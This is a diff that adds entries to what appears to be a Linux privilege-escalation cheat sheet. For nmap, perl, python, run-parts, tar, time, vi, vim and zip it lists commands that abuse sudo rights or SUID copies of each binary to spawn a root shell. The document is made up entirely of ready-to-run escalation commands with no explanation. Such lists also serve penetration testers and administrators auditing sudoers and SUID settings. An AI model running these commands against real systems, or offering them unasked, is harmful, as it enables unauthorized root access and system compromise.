@@ -123,3 +123,97 @@ sudo nmap --script=$TF
 sudo nmap --interactive
 nmap> !sh
 ```
+### SUID
+```
+sudo sh -c 'cp $(which nmap) .; chmod +s ./nmap'
+
+TF=$(mktemp)
+echo 'os.execute("/bin/sh")' > $TF
+./nmap --script=$TF
+```
+# PERL
+### SUDO
+```
+sudo perl -e 'exec "/bin/sh";'
+```
+### SUID
+```
+sudo sh -c 'cp $(which perl) .; chmod +s ./perl'
+
+./perl -e 'exec "/bin/sh";'
+```
+# PYTHON
+### SUDO
+```
+sudo python -c 'import os; os.system("/bin/sh")'
+```
+### SUID
+```
+sudo sh -c 'cp $(which python) .; chmod +s ./python'
+
+./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
+# RUN-PARTS
+### SUDO
+```
+sudo run-parts --new-session --regex '^sh$' /bin
+```
+### SUID
+```
+sudo sh -c 'cp $(which run-parts) .; chmod +s ./run-parts'
+
+./run-parts --new-session --regex '^sh$' /bin --arg='-p'
+```
+# TAR
+### SUDO
+```
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+```
+### SUID
+```
+sudo sh -c 'cp $(which tar) .; chmod +s ./tar'
+
+./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+```
+# TIME
+### SUDO
+```
+sudo /usr/bin/time /bin/sh
+```
+### SUID
+```
+sudo sh -c 'cp $(which time) .; chmod +s ./time'
+
+./time /bin/sh -p
+```
+# VI
+### SUDO
+```
+sudo vi -c ':!/bin/sh' /dev/null
+```
+# VIM
+### SUDO
+```
+sudo vim -c ':!/bin/sh'
+```
+### SUID
+```
+sudo sh -c 'cp $(which vim) .; chmod +s ./vim'
+
+./vim -c ':lua os.execute("reset; exec sh")'
+```
+# ZIP
+### SUDO
+```
+TF=$(mktemp -u)
+sudo zip $TF /etc/hosts -T -TT 'sh #'
+sudo rm $TF
+```
+### SUID
+```
+sudo sh -c 'cp $(which zip) .; chmod +s ./zip'
+
+TF=$(mktemp -u)
+./zip $TF /etc/hosts -T -TT 'sh #'
+sudo rm $TF
+```
